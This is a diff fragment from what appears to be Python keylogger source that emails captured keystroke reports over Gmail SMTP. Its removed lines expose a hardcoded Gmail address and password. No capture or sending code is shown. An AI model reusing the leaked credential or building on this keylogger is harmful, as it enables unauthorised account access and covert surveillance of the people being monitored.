@@ -6,8 +6,8 @@ import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Semaphore, Timer
 SEND_REPORT_EVERY = 10 # 10 minutes
-EMAIL_ADDRESS = "rlkforensics@gmail.com"
-EMAIL_PASSWORD = "aWn32ZseLnqX"
+EMAIL_ADDRESS = "@gmail.com"
+EMAIL_PASSWORD = ""
 
 class Keylogger:
     def __init__(self, interval):
